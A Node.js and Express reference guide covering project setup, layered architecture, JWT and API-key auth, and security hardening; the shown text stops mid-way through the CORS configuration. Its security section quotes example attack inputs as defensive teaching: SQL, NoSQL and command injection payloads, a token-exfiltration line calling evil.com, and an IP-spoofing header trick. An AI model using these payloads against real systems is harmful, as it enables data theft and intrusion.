Introduction

This is a production-oriented reference guide for building web applications with Node.js and Express. It was developed through a series of in-depth explorations covering the full application stack — each section goes beyond syntax to explain the reasoning behind decisions, the tradeoffs between approaches, and the failure modes to watch for in production. Code examples reflect current best practices as of 2025.

The guide is intended to be consulted during development rather than read front to back. If you're setting up a new project, start with Setup. If you're hardening an existing app, jump to Security or Supply chain. If something is failing in production and you're not sure why, Observability is where you want to be.

Conventions used throughout

All examples use TypeScript with strict: true, ESM (type: "module"), and Node.js v22 LTS. Package choices reflect current community consensus — jose over jsonwebtoken, csrf-csrf over the deprecated csurf, argon2id over bcrypt, shx for cross-platform build scripts. Where a package has been deprecated or has known vulnerabilities, that is called out explicitly.

This guide is a living document. Sections will be added and updated as the stack evolves and new topics are covered.

Project initialization

Start every project with ESM and modern Node. Avoid CommonJS for new projects — import/export is the standard and CommonJS interop gets messier over time, not easier.

Bootstrap

mkdir my-api && cd my-api
node --version      # aim for LTS (v22+)
npm init -y
npm pkg set type="module"

Core dependencies

npm i express
npm i -D nodemon tsx typescript @types/node @types/express shx

tsx runs .ts files directly without a build step in dev. shx wraps Unix shell commands so your npm scripts work identically on Mac, Windows, and Linux CI runners without PowerShell workarounds.

package.json scripts

{
  "type": "module",
  "scripts": {
    "build":        "npm run clean && tsc && npm run copy:static",
    "copy:static":  "shx cp -r src/static dist/static",
    "clean":        "shx rm -rf dist",
    "dev":          "nodemon --exec tsx src/index.ts",
    "start":        "node dist/index.js"
  }
}
Use TypeScript by default. The upfront cost is tiny; the long-term gain in refactoring safety, autocomplete, and caught errors is large. strict: true in tsconfig catches an entire class of bugs at compile time.

tsconfig essentials

{
  "compilerOptions": {
    "target": "ES2022",
    "module": "Node16",
    "moduleResolution": "Node16",
    "outDir": "dist",
    "strict": true,
    "esModuleInterop": true
  }
}

module: "Node16" and moduleResolution: "Node16" work together to enforce that all local imports include file extensions (./users.service.js) — which is required for ESM in Node. This trips people up initially but reflects how Node actually resolves modules at runtime.

Project structure

Organize by feature, not by file type. A flat controllers/ + models/ layout feels organized at first but breaks down once you have more than a handful of features — every change touches multiple directories, and there's no clear ownership of a feature's behaviour.

Feature folders keep cohesion high: everything related to orders lives in features/orders/. Coupling is explicit: if orders imports from users, you can see it clearly.

src/ ├── index.ts # entry — starts server, nothing else ├── app.ts # express setup — no listen() ├── config/ │ └── index.ts # env validation + typed export ├── static/ # committed source of truth for assets │ └── public/ │ ├── index.html │ ├── css/ │ ├── js/ │ └── images/ ├── features/ │ ├── users/ │ │ ├── index.ts # barrel — public API only │ │ ├── users.router.ts │ │ ├── users.controller.ts │ │ ├── users.service.ts │ │ ├── users.repository.ts │ │ ├── users.schema.ts │ │ └── users.test.ts │ └── orders/ │ └── ... # same shape as users ├── middleware/ │ ├── auth.ts │ ├── errorHandler.ts │ └── requestLogger.ts ├── lib/ │ ├── db.ts # singleton DB client │ ├── tokens.ts # JWT sign/verify │ ├── crypto.ts # password hashing │ ├── apiKeys.ts │ └── errors.ts # custom error classes └── types/ └── express.d.ts # augment Request type dist/ # git-ignored, fully generated prisma/ ├── schema.prisma └── migrations/

The two-file server pattern

app.ts configures Express (registers middleware, routes, error handler) but never calls listen(). index.ts imports the app and starts the server. This separation means test files can import app directly and make HTTP assertions without binding a real port — a small decision that makes every integration test cleaner.

Config & environment

Never scatter process.env.X calls throughout your codebase. Validate everything at startup in one place and export a typed config object. If any variable is missing or malformed, the process exits immediately with a clear error — not silently at runtime when a request hits a broken code path an hour after deployment.

// src/config/index.ts
import { z } from 'zod'

const schema = z.object({
  NODE_ENV:            z.enum(['development', 'test', 'production']),
  PORT:                z.coerce.number().default(3000),
  DB_URL:              z.string().url(),
  JWT_ACCESS_SECRET:   z.string().min(32),
  JWT_REFRESH_SECRET:  z.string().min(32),
  CSRF_SECRET:         z.string().min(32),
  COOKIE_SECRET:       z.string().min(32),
  ALLOWED_ORIGINS:     z.string(),
})

export const config = schema.parse(process.env)

if (config.NODE_ENV === 'production' && !config.ALLOWED_ORIGINS) {
  throw new Error('ALLOWED_ORIGINS must be explicitly set in production')
}

Node 20.6+ has a built-in --env-file flag: node --env-file=.env src/index.ts — no dotenv package needed in development. Use it in your dev script.

Never commit secrets. In production use a dedicated secrets manager — Vault, Doppler, AWS Secrets Manager. Environment variables in deployment configs (Docker Compose, k8s manifests) should reference secrets by name, not inline their values.

Static files

tsc only processes .ts files. It ignores everything else — HTML, CSS, images, fonts. You need a parallel copy step that runs alongside the TypeScript compiler so static assets land in dist/ in the right location.

src/static/ is the committed source of truth. dist/ is entirely generated and git-ignored. The build system copies src/static/ to dist/static/ so Express can serve it at runtime.

Express serving

import { fileURLToPath } from 'url'
import { join, dirname } from 'path'

// ESM doesn't provide __dirname natively — this pattern is required
const __dirname = dirname(fileURLToPath(import.meta.url))

app.use(express.static(join(__dirname, 'static', 'public'), {
  maxAge:  '1d',
  etag:    true,
  index:   'index.html',
}))

Server setup

Keep app.ts clean and in a deliberate order: security middleware first, then body parsing, then logging, then routes, then the catch-all 404, then the error handler last. The error handler must be the final app.use — Express identifies it by its four-argument signature.

app.ts

import express from 'express'
import helmet from 'helmet'
import cors from 'cors'
import cookieParser from 'cookie-parser'
import { corsOptions } from './config/cors.js'
import { ordersRouter } from './features/orders/index.js'
import { errorHandler } from './middleware/errorHandler.js'
import { requestLogger } from './middleware/requestLogger.js'
import { config } from './config/index.js'

export const app = express()

// Exact number of proxy hops between internet and this process
// Required for req.ip and rate limiting to work correctly behind Nginx
app.set('trust proxy', 1)

app.use(helmet({ /* see Security section */ }))
app.use(cors(corsOptions))
app.options('*', cors(corsOptions))         // handle preflight for all routes
app.use(cookieParser(config.COOKIE_SECRET))
app.use(express.json({ limit: '100kb' }))
app.use(express.urlencoded({ extended: true, limit: '100kb' }))
app.use(requestLogger)

app.use('/api/v1/orders', ordersRouter)
// ... other feature routers

app.use((req, res) => res.status(404).json({ code: 'NOT_FOUND' }))
app.use(errorHandler)

index.ts

import { createServer } from 'http'
import { app } from './app.js'
import { db } from './lib/db.js'
import { config } from './config/index.js'

const server = createServer(app)

// Prevent slow-loris and connection exhaustion attacks
server.headersTimeout   = 20_000
server.requestTimeout   = 30_000
server.keepAliveTimeout = 5_000

async function start() {
  if (config.NODE_ENV === 'production') {
    const { execSync } = await import('child_process')
    execSync('npx prisma migrate deploy', { stdio: 'inherit' })
  }
  await db.$connect()
  // Bind to 127.0.0.1 — only reachable via Nginx, never directly
  server.listen(config.PORT, '127.0.0.1', () => {
    console.log(`Ready on port ${config.PORT}`)
  })
}

async function shutdown() {
  server.close()
  await db.$disconnect()
  process.exit(0)
}

process.on('SIGTERM', shutdown)
process.on('SIGINT',  shutdown)
process.on('unhandledRejection', (err) => {
  console.error('Unhandled rejection:', err)
  process.exit(1)
})

start()
Always handle SIGTERM. Kubernetes and Docker send it before killing your container. server.close() stops accepting new connections and waits for in-flight requests to finish before the process exits.

Routing

Routers are purely declarative — they express which method, which path, which middleware runs first, and which controller handles the request. No logic lives in a router file.

Router

// features/orders/orders.router.ts
import { Router } from 'express'
import { authenticate, authorize } from '../../middleware/auth.js'
import * as ctrl from './orders.controller.js'

export const ordersRouter = Router()

ordersRouter.get('/',        authenticate, ctrl.listOrders)
ordersRouter.get('/:id',     authenticate, ctrl.getOrder)
ordersRouter.post('/',       authenticate, ctrl.createOrder)
ordersRouter.patch('/:id',   authenticate, ctrl.updateOrder)
ordersRouter.delete('/:id',  authenticate, authorize('admin'), ctrl.deleteOrder)

Controller — the HTTP translator

Each handler does exactly three things: extract from req, delegate to the service with plain data, respond with the result. HTTP decisions (status codes, response shape) live here. Domain decisions do not.

// orders.controller.ts
export async function createOrder(req, res, next) {
  try {
    const body   = createOrderSchema.parse(req.body)
    const userId = req.user.id
    const order  = await ordersService.createOrder(userId, body)
    res.status(201).json(order)
  } catch (err) { next(err) }
}

export async function cancelOrder(req, res, next) {
  try {
    await ordersService.cancelOrder(req.params.id, req.user.id)
    res.status(204).send()
  } catch (err) { next(err) }
}
Each handler function is what stays short (~10 lines), not the entire controller file. A controller with 5 CRUD handlers is naturally 50–70 lines. The moment you write an if about a domain rule inside a controller, that logic belongs in the service.
DON'T — logic in a controller

Checking inventory, calculating totals, enforcing business rules, querying the DB — all of this belongs in the service layer.

Middleware

Middleware is a function with the signature (req, res, next). Write it as a named, exported function — not an inline anonymous arrow. Named functions appear in stack traces, can be unit tested independently, and communicate intent clearly.

Request logger (structured)

export function requestLogger(req, res, next) {
  const start = Date.now()
  res.on('finish', () => {
    logger.info({
      method:    req.method,
      path:      req.path,
      status:    res.statusCode,
      ms:        Date.now() - start,
      requestId: req.id,
    })
  })
  next()
}

Request ID — for distributed tracing

import { randomUUID } from 'crypto'

app.use((req, res, next) => {
  req.id = (req.headers['x-request-id'] as string) ?? randomUUID()
  res.setHeader('x-request-id', req.id)
  next()
})

Pass req.id into every log call and DB query. This lets you trace a full request through your logs — invaluable when debugging production issues.

Async patterns

Express 4 does not catch async errors automatically. An unhandled promise rejection inside a route handler crashes the process in older Node versions or silently swallows the error. You must either use a wrapper or upgrade to Express 5.

Express 4 — asyncHandler wrapper

// lib/asyncHandler.ts
import type { RequestHandler } from 'express'

export function asyncHandler(fn: RequestHandler): RequestHandler {
  return (req, res, next) =>
    Promise.resolve(fn(req, res, next)).catch(next)
}

// Usage — errors automatically forwarded to error handler
export const getUser = asyncHandler(async (req, res) => {
  const user = await usersService.getById(req.params.id)
  if (!user) throw new NotFoundError()
  res.json(user)
})

Express 5 — recommended for new projects

npm i express@5

// Async errors are automatically forwarded — no wrapper needed
app.get('/users/:id', async (req, res) => {
  const user = await usersService.getById(req.params.id)
  if (!user) throw new NotFoundError()
  res.json(user)
})
Even with Express 5, keep your global error handler and handle process.on('unhandledRejection'). Errors outside the request lifecycle (in background workers, DB connection handlers, scheduled tasks) still need explicit handling.

Error handling

Define a custom error class hierarchy. Your global error handler maps these to HTTP responses. Everything else maps to 500. The key principle: errors flow upward via next(err) from anywhere in the stack and exit through one single handler — never scattered res.status(500).send() calls throughout controllers.

Custom error classes

// lib/errors.ts
export class AppError extends Error {
  constructor(
    public statusCode: number,
    public code: string,
    message: string
  ) { super(message) }
}

export class NotFoundError     extends AppError { constructor(m = 'Not found')     { super(404, 'NOT_FOUND', m) } }
export class UnauthorizedError extends AppError { constructor(m = 'Unauthorized')  { super(401, 'UNAUTHORIZED', m) } }
export class ForbiddenError    extends AppError { constructor(m = 'Forbidden')     { super(403, 'FORBIDDEN', m) } }
export class ConflictError     extends AppError { constructor(m = 'Conflict')      { super(409, 'CONFLICT', m) } }
export class ValidationError   extends AppError { constructor(m = 'Invalid input') { super(422, 'VALIDATION_ERROR', m) } }

Global error handler — must be last middleware in app.ts

import type { ErrorRequestHandler } from 'express'
import { ZodError } from 'zod'

export const errorHandler: ErrorRequestHandler = (err, req, res, _next) => {
  if (err instanceof ZodError) {
    return res.status(422).json({
      code:   'VALIDATION_ERROR',
      errors: err.flatten()
    })
  }
  if (err instanceof AppError) {
    return res.status(err.statusCode).json({
      code:    err.code,
      message: err.message
    })
  }
  logger.error({ err, requestId: req.id }, 'Unhandled error')
  res.status(500).json({ code: 'INTERNAL_ERROR' })
}
Never send err.stack, internal error messages, or DB error details to clients in production. An attacker can use stack traces and SQL error messages to understand your schema and infrastructure.

Router → Controller → Service

This is the pattern that underpins the entire module design. Each layer has a precisely defined job and knows nothing about the layers above it.

The three rules of a controller method

1 — Extract

Pull data from req: params, validated body, query string, req.user from auth middleware. Nothing else.

2 — Delegate

Call the service with plain data. Never pass req or res into a service — this would couple your business logic to Express.

3 — Respond

Set the HTTP status code and serialize the result. Status code decisions (201 vs 200, 204 no body) are HTTP concerns and live here.

A complete feature — POST /orders

// orders.router.ts — declarative only
ordersRouter.post('/', authenticate, ctrl.createOrder)

// orders.controller.ts — HTTP translation, ~8 lines
export async function createOrder(req, res, next) {
  try {
    const body  = createOrderSchema.parse(req.body)
    const order = await ordersService.createOrder(req.user.id, body)
    res.status(201).json(order)
  } catch (err) { next(err) }
}

// orders.service.ts — all the real decisions
export async function createOrder(userId, input) {
  for (const item of input.items) {
    const product = await productsRepo.findById(item.productId)
    if (!product)                      throw new NotFoundError(`Product not found`)
    if (product.stock < item.quantity) throw new ConflictError('Insufficient stock')
  }
  const total = input.items.reduce((s, i) => s + i.quantity * i.unitPrice, 0)
  return db.$transaction(async (tx) => {
    const order = await ordersRepo.createWithItems(userId, input, total, tx)
    for (const item of input.items)
      await productsRepo.decrementStock(item.productId, item.quantity, tx)
    return order
  })
}

The litmus test: could you call ordersService.createOrder() from a CLI script, a cron job, or a WebSocket handler? If yes — no req passed in, no Express imports — the separation is clean.

Barrel exports

The barrel (index.ts) is the public API for consumers outside the feature. Think of it as the feature's package boundary — what it publishes vs what it keeps private.

Internal imports — direct, always fine

// orders.controller.ts — inside the feature, imports siblings directly
import { createOrderSchema } from './orders.schema.js'
import * as ordersService from './orders.service.js'

External imports — barrel only

// app.ts — outside the feature
import { ordersRouter } from './features/orders/index.js'

// Another feature needing the Order type
import type { Order } from './features/orders/index.js'

The barrel — selective, editorial

// features/orders/index.ts
export { ordersRouter } from './orders.router.js'
export type { Order, CreateOrderInput } from './orders.schema.js'

// NOT exported: service, controller, repository, schema internals
// They are implementation details. If the invoices feature wants
// to fetch an order, it should call the orders API — not import
// directly from orders.service.ts

Why this boundary matters in practice

The barrel isn't bureaucracy — it's the mechanism that lets you refactor a feature's internals without breaking the rest of the codebase. Consider what happens without it.

The invoices feature needs to fetch an order to build an invoice. A developer takes the path of least resistance and imports directly from the orders feature's internals:

// features/invoices/invoices.service.ts
// Reaches directly into orders internals — seems harmless
import { getOrderById } from '../orders/orders.service.js'

This works fine until you refactor the orders feature. You split orders.service.ts into orders.query.service.ts and orders.mutation.service.ts to separate read and write concerns. The function still exists — it just moved. But now the invoices feature is broken, and so is any other feature that imported directly. You have to track down every import across the codebase and update it. The refactor that should have been internal to the orders feature has become a cross-cutting change.

// With the barrel enforced — invoices only sees the public API
import { getOrderById } from '../orders/index.js'

// Now you can restructure orders internals freely.
// As long as index.ts continues to export getOrderById,
// invoices is unaffected. The refactor stays local.

The discipline is: if you find yourself writing an import that reaches past an index.ts into a feature's internal files, stop. Either the thing you need should be added to that feature's public API, or your feature shouldn't be depending on it at all — it should go through a service call or a shared lib/ utility instead.

A useful rule of thumb: only export from index.ts what you'd be comfortable treating as a stable, versioned interface — something you'd have to write a migration or a deprecation notice to change. The router (always), public types (usually), and occasionally a service method for legitimate inter-feature calls. Never controllers, never internal helpers, never repository functions.

Classes vs functions

The current best-practice lean in the Express community is plain functions for controllers and class-based services when testability matters.

Controllers — why functions win in plain Express

// PROBLEM with class-based controllers
class OrdersController {
  async createOrder(req, res, next) { ... }
}
const controller = new OrdersController()

// 'this' context is lost when Express calls the method
ordersRouter.post('/', controller.createOrder)           // broken
ordersRouter.post('/', controller.createOrder.bind(controller)) // ugly

// Functions just work
export async function createOrder(req, res, next) { ... }
ordersRouter.post('/', createOrder)                      // direct

Services — classes are the stronger choice

// Class-based service: dependencies injected, swappable in tests
export class OrdersService {
  constructor(
    private readonly db: PrismaClient,
    private readonly email: EmailService,
  ) {}
  async createOrder(userId, input) {
    // this.db and this.email — inject mocks in tests
  }
}

// Test — no vi.mock() gymnastics needed
const mockDb    = { order: { create: vi.fn() } }
const mockEmail = { sendOrderConfirmation: vi.fn() }
const service   = new OrdersService(mockDb, mockEmail)

Connection & tool selection

The singleton pattern

// lib/db.ts
import { PrismaClient } from '@prisma/client'
import { config } from '../config/index.js'

const globalForPrisma = globalThis as unknown as { prisma: PrismaClient | undefined }

export const db = globalForPrisma.prisma ?? new PrismaClient({
  log: config.NODE_ENV === 'development'
    ? ['query', 'warn', 'error']
    : ['warn', 'error'],
})

if (config.NODE_ENV !== 'production') globalForPrisma.prisma = db

Tool selection

Prisma
Schema-first (schema.prisma), generated client, excellent TypeScript types. Best default for most apps.
Drizzle
Code-first, schema in TypeScript, no codegen step. Queries look like SQL. Growing fast.
Knex
Query builder, not ORM. Good for fine-grained query control or migrating legacy codebases.
Raw pg
Maximum control. Use alongside an ORM for specific performance-critical hot paths.

Repository pattern

The repository wraps your ORM and presents a domain-shaped API to the service. The service never imports Prisma directly — it talks to the repository. If you later swap ORMs, only the repository file changes.

// orders.repository.ts
import { db } from '../../lib/db.js'
import type { PrismaClient, Prisma } from '@prisma/client'

type Tx = Prisma.TransactionClient

export async function findById(id: string, tx: Tx | PrismaClient = db) {
  return (tx).order.findUnique({
    where: { id }, include: { items: true, user: { select: { id: true, email: true } } }
  })
}

export async function findByUser(userId: string, cursor?: string, pageSize = 20) {
  return db.order.findMany({
    where:   { userId },
    take:    pageSize,
    skip:    cursor ? 1 : 0,
    cursor:  cursor ? { id: cursor } : undefined,
    orderBy: { createdAt: 'desc' },
    include: { items: true }
  })
}

export async function createWithItems(userId, input, total, tx: Tx | PrismaClient = db) {
  return (tx).order.create({
    data: {
      userId, total, status: 'PENDING',
      items: { create: input.items.map(i => ({
        productId: i.productId, quantity: i.quantity, unitPrice: i.unitPrice
      }))}
    },
    include: { items: true }
  })
}

export async function updateStatus(id: string, status: string, tx: Tx | PrismaClient = db) {
  return (tx).order.update({ where: { id }, data: { status } })
}
The repository is the one file in a feature that imports from lib/db.ts. This is the file you mock in unit tests — not Prisma directly.

Transactions

Transactions are a service-layer concern. The service knows which operations must succeed or fail atomically. The optional tx parameter pattern bridges them: repository functions work standalone or inside a transaction without any change to their call signature.

// orders.service.ts — the service owns the transaction boundary
export async function createOrder(userId: string, input: CreateOrderInput) {
  for (const item of input.items) {
    const product = await productsRepo.findById(item.productId)
    if (!product)                      throw new NotFoundError(`Product ${item.productId} not found`)
    if (product.stock < item.quantity) throw new ConflictError(`Insufficient stock for ${product.name}`)
  }
  const total = input.items.reduce((s, i) => s + i.quantity * i.unitPrice, 0)

  return db.$transaction(async (tx) => {
    const order = await ordersRepo.createWithItems(userId, input, total, tx)
    for (const item of input.items)
      await productsRepo.decrementStock(item.productId, item.quantity, tx)
    return order
  })
}
The optional tx parameter with a default of the global db client is the key technique. Repository functions become composable into transactions without knowing they're being composed.

Auth strategy overview

The right auth strategy depends on who is making the request. Human users in browsers have different needs from machine clients calling an API.

TokenLifetimeRationale
Access token15 minutesShort enough that a leaked token expires quickly
Refresh token7–30 daysLong enough not to annoy users; stored in DB so it can be revoked
OAuth state param10 minutesOnly needs to survive the redirect roundtrip
Password reset token1 hourShort window reduces exposure if email is compromised
Email verification24 hoursReasonable for user workflow

JWT access + refresh token flow

Two tokens, two jobs. The access token is short-lived and stateless — verify its signature and trust it. The refresh token is long-lived and stored in the database — it can be revoked, and it enables token rotation which detects stolen tokens.

Token reuse detection — critical

On refresh, the token is atomically deleted from the DB before issuing a new one. If the same token is presented twice, it was already deleted — meaning it was either stolen or the client is retrying. Either way, revoke all sessions for that user immediately.

Never store tokens in localStorage. Any XSS vulnerability — including in a third-party script — can silently exfiltrate localStorage contents. The attacker gets a persistent token they can use from anywhere.

Token utilities

Use jose over jsonwebtoken for new projects. It's actively maintained, supports the Web Crypto API, and has a cleaner modern API.

// lib/tokens.ts
import { SignJWT, jwtVerify, type JWTPayload } from 'jose'
import { config } from '../config/index.js'

const accessSecret  = new TextEncoder().encode(config.JWT_ACCESS_SECRET)
const refreshSecret = new TextEncoder().encode(config.JWT_REFRESH_SECRET)

export interface TokenPayload extends JWTPayload {
  userId: string
  role:   string
}

export async function signAccessToken(payload: Omit) {
  return new SignJWT(payload)
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .sign(accessSecret)
}

export async function signRefreshToken(payload: Omit) {
  return new SignJWT(payload)
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('7d')
    .sign(refreshSecret)
}

export async function verifyAccessToken(token: string): Promise {
  const { payload } = await jwtVerify(token, accessSecret)
  return payload as TokenPayload
}

export async function verifyRefreshToken(token: string): Promise {
  const { payload } = await jwtVerify(token, refreshSecret)
  return payload as TokenPayload
}

Login — with timing-attack prevention

export async function login(email: string, password: string) {
  const user = await usersRepo.findByEmail(email)

  // CRITICAL: always run verifyPassword regardless of whether the user exists.
  // Without this, response time differences reveal valid email addresses.
  const hash  = user?.password ?? '$argon2id$v=19$m=65536,t=3,p=4$placeholder'
  const valid = await verifyPassword(hash, password)

  if (!user || !valid) throw new UnauthorizedError('Invalid credentials')
  if (!user.isActive)  throw new UnauthorizedError('Account disabled')

  const payload = { userId: user.id, role: user.role }
  const [accessToken, refreshToken] = await Promise.all([
    signAccessToken(payload), signRefreshToken(payload),
  ])
  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  await authRepo.storeRefreshToken(user.id, refreshToken, expiresAt)
  return { accessToken, refreshToken, user: { id: user.id, email: user.email, role: user.role } }
}

Refresh — with rotation and reuse detection

export async function refresh(incomingToken: string) {
  let payload
  try { payload = await verifyRefreshToken(incomingToken) }
  catch { throw new UnauthorizedError('Invalid refresh token') }

  const stored = await authRepo.findAndDeleteRefreshToken(incomingToken)
  if (!stored || stored.expiresAt < new Date()) {
    if (payload?.userId) await authRepo.deleteAllUserTokens(payload.userId)
    throw new UnauthorizedError('Refresh token reused or expired')
  }

  const tokenPayload = { userId: payload.userId, role: payload.role }
  const [accessToken, refreshToken] = await Promise.all([
    signAccessToken(tokenPayload), signRefreshToken(tokenPayload),
  ])
  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  await authRepo.storeRefreshToken(payload.userId, refreshToken, expiresAt)
  return { accessToken, refreshToken }
}

API keys

API keys are for machine-to-machine clients — other services, CLI tools, third-party integrations. Hash before storing, return the raw key once and never again.

// lib/apiKeys.ts
import { randomBytes, createHash } from 'crypto'

export function generateApiKey() {
  const raw    = `sk_${randomBytes(32).toString('base64url')}`
  const hash   = createHash('sha256').update(raw).digest('hex')
  const prefix = raw.slice(0, 10)
  return { raw, hash, prefix }
}

export const hashApiKey = (raw: string) =>
  createHash('sha256').update(raw).digest('hex')

API key middleware

export async function authenticateApiKey(req, res, next) {
  const key = req.headers['x-api-key'] as string
  if (!key) return next(new UnauthorizedError())

  const apiKey = await db.apiKey.findUnique({
    where: { hash: hashApiKey(key) }, include: { user: true }
  })
  if (!apiKey?.isActive) return next(new UnauthorizedError())
  if (apiKey.expiresAt && apiKey.expiresAt < new Date())
    return next(new UnauthorizedError('API key expired'))

  db.apiKey.update({ where: { id: apiKey.id },
    data: { lastUsedAt: new Date() } }).catch(() => {})

  req.user = { userId: apiKey.userId, role: apiKey.user.role }
  next()
}
Store prefix (first 10 chars) alongside the hash. This lets you show users which key is which in your UI ("sk_a3f9b2...") without storing anything that could reconstruct the key.

Security defence layers

No single control stops all attacks. Security is a set of overlapping layers — if one fails, others catch what slipped through.

An attacker trying to reach your database has to pass through all five layers. Input validation stops injection. Auth middleware stops unauthorized access. Parameterized queries stop SQL injection even if validation somehow fails.

Injection attacks

Injection is the #1 category in the OWASP Top 10. SQL, NoSQL, command, and LDAP injection all share the same root cause: unsanitized user input interpreted as code. The fix is always the same: never concatenate user input into commands or queries.

SQL injection

// VULNERABLE — attacker sends: email = "' OR 1=1; DROP TABLE users; --"
const user = await db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`)

// SAFE — parameterized query
const user = await db.query('SELECT * FROM users WHERE email = $1', [req.body.email])

// Prisma template literal IS safe — parameterizes automatically
const user = await db.$queryRaw`SELECT * FROM users WHERE email = ${req.body.email}`

// UNSAFE even with Prisma — direct interpolation, no parameterization
const user = await db.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${req.body.email}'`)

NoSQL injection (MongoDB)

// VULNERABLE — attacker sends { "email": { "$gt": "" } }
await db.collection('users').findOne({ email: req.body.email })

// SAFE — Zod validates that email is a string before it reaches the DB
const { email } = z.object({ email: z.string().email() }).parse(req.body)
await db.collection('users').findOne({ email })

Command injection

// VULNERABLE
exec(`convert ${req.body.filename} output.png`)

// SAFE — execFile with argument array: no shell, no injection
execFile('convert', [sanitizedFilename, 'output.png'])

Cross-Site Scripting (XSS)

XSS lets attackers inject scripts into pages viewed by other users. A successful attack can steal tokens, impersonate users, and exfiltrate data invisibly.

Layer 1 — Zod input validation

Reject malformed input at the controller boundary. A name field expecting text should reject HTML via an allowlist regex.

Layer 2 — output escaping

Template engines (Handlebars, EJS, Nunjucks) auto-escape output by default. Treat any unescaped output tag as a deliberate decision requiring code review justification.

Layer 3 — CSP with nonces

Even if malicious content is stored and rendered, a correctly configured CSP with nonces prevents it from executing.

Layer 4 — httpOnly cookies

Refresh tokens in httpOnly cookies are inaccessible to JavaScript entirely. A successful XSS attack can't steal the refresh token.

Token storage — the localStorage trap

The most common advice for storing JWTs in a browser is "use localStorage." It's also wrong from a security standpoint. The reason comes down to what XSS actually gives an attacker access to.

Any JavaScript running on your page — including third-party analytics scripts, ad scripts, CDN-hosted libraries, and any injected malicious code — can read localStorage unconditionally. There is no same-origin protection for localStorage reads within the same origin. A single compromised dependency in your frontend bundle, or a single stored XSS vulnerability anywhere on your domain, gives an attacker the ability to silently exfiltrate every token stored there. They don't need to be running in your app's code — they just need to be running on the same origin.

// VULNERABLE — any XSS on your domain exposes this immediately,
// including XSS in a third-party script you loaded via npm or CDN
localStorage.setItem('access_token', token)

// Attacker's injected or compromised script:
fetch('https://evil.com?t=' + localStorage.getItem('access_token'))
// Silent. Instant. Requires no interaction from the user.
// The attacker now has a valid token they can use from anywhere.
// SAFE — access token lives in a JS module-scoped variable
// It is gone on page reload, but that is the intended behaviour.
// XSS running in the same session can theoretically read it,
// but cannot exfiltrate it silently across sessions or page reloads.
let accessToken: string | null = null

// On login:
accessToken = response.data.accessToken

// On page reload — silently refresh using the httpOnly cookie:
// POST /auth/refresh is called on app init.
// The browser sends the httpOnly cookie automatically.
// You get a new access token back in the response body.
// The user never notices.

// On every API request:
headers: { Authorization: `Bearer ${accessToken}` }
The refresh token in an httpOnly cookie is the backstop. Even if the access token is somehow read from memory during an active XSS attack, the refresh token — the long-lived credential — is completely inaccessible to JavaScript. httpOnly means the browser will never expose the cookie value to any script, regardless of origin or circumstances.
This pattern means users are "logged out" on page refresh until the silent token refresh completes. Design your app's loading state to account for this — show a loading indicator while the refresh is in flight rather than immediately redirecting to login.

DOM sinks — never pass user data to these

element.innerHTML   = userInput   // DANGEROUS — parses and executes HTML/JS
eval(userInput)                   // DANGEROUS

element.textContent = userInput   // SAFE — treated as text, never executed

trust proxy — get it exactly right

This is one of the most commonly misconfigured Express settings, and the consequences are security-relevant, not just operational. The setting tells Express how many proxy hops to trust when reading the X-Forwarded-For header — which is how req.ip gets its value.

// WRONG — trusts the entire X-Forwarded-For chain unconditionally
app.set('trust proxy', true)

// An attacker can now send:
// X-Forwarded-For: 1.2.3.4
// Express sets req.ip = '1.2.3.4' — a completely fabricated address
// Your IP-based rate limiter is now trivially bypassable:
// every request appears to come from a different IP

// CORRECT — set to the exact number of proxy hops between
// the internet and your Node process
// Internet → Nginx → Node: set to 1
app.set('trust proxy', 1)

// Internet → Cloudflare → Nginx → Node: set to 2
app.set('trust proxy', 2)

The attack this enables when misconfigured: an attacker targeting your login endpoint sends a unique fabricated IP in every request. Your rate limiter keys by req.ip — it sees a different IP each time and never triggers. The brute force limit you carefully configured provides zero protection. Setting the exact hop count means Express only trusts the last N hops of the forwarded chain, which your own infrastructure controls.

Setting trust proxy: true unconditionally trusts the entire X-Forwarded-For chain. Since any client can send arbitrary values in that header, this allows complete IP spoofing — bypassing all IP-based rate limiting and any geo-restriction logic that relies on req.ip.

How supply chain attacks work

A supply chain attack doesn't target your code — it targets the code your code depends on. The attacker poisons a package upstream and it gets pulled in automatically.

1
Target selection

Attackers identify high-value maintainers — people who own packages with hundreds of millions of weekly downloads.

2
Phishing for credentials

Attackers send email from lookalike domains. The fake page captures both the login password and the live TOTP code in real time, using them immediately before they expire.

3
Malicious publish

With stolen credentials, attackers publish new patch versions containing a postinstall script that exfiltrates environment variables, SSH keys, and installs a persistent backdoor.

4
Self-replicating spread

A worm uses npm tokens stolen from infected machines to compromise other maintainers' accounts and publish malicious versions of their packages.

5
Blast radius

Any developer or CI runner that ran npm install (not npm ci) during the window pulled the compromised version.

The difference between npm install and npm ci was the difference between being compromised and not. npm ci installs exactly what's in package-lock.json — period.

Why TOTP isn't enough

Hardware security keys (WebAuthn/FIDO2) cannot be phished this way. The key signs a challenge bound to the legitimate domain — a fake login page cannot extract a usable credential. A TOTP code, by contrast, can be relayed in real time.

CORS mental model

CORS is a browser enforcement mechanism — not a server security feature in the traditional sense. When you configure CORS on your Express server, you are telling browsers which cross-origin JavaScript is allowed to read your API responses. You are not blocking requests from reaching your server.

A direct consequence: CORS does nothing to protect against requests made by non-browser clients. curl, Postman, other servers, and mobile apps all ignore CORS headers entirely. Your real server-side protection is authentication and authorization.

What "origin" means precisely

https://app.example.com       ← origin A
http://app.example.com        ← DIFFERENT (different protocol)
https://api.example.com       ← DIFFERENT (different subdomain)
https://app.example.com:8080  ← DIFFERENT (different port)
https://app.example.com/path  ← SAME ORIGIN (path is irrelevant)

Simple vs preflighted requests

Preflighted requests — DELETE, PUT, PATCH, or any request with custom headers like Authorization — trigger an OPTIONS request first. The browser asks your server: "will you allow this cross-origin DELETE with these headers?" If it doesn't respond correctly, the real request never fires.

The cors package handles OPTIONS preflight automatically when applied as app-level middleware via app.use(cors(options)). If you apply CORS per-route, you must also add app.options('*', cors(options)) globally.

CORS configuration

// config/cors.ts
import cors from 'cors'
import { config } from './index.js'

const allowedOrigins = new Set(
  config.ALLOWED_ORIGINS.split(',').map(o => o.trim())
)

export const corsOptions: cors.CorsOptions = {
  origin(origin, callback) {
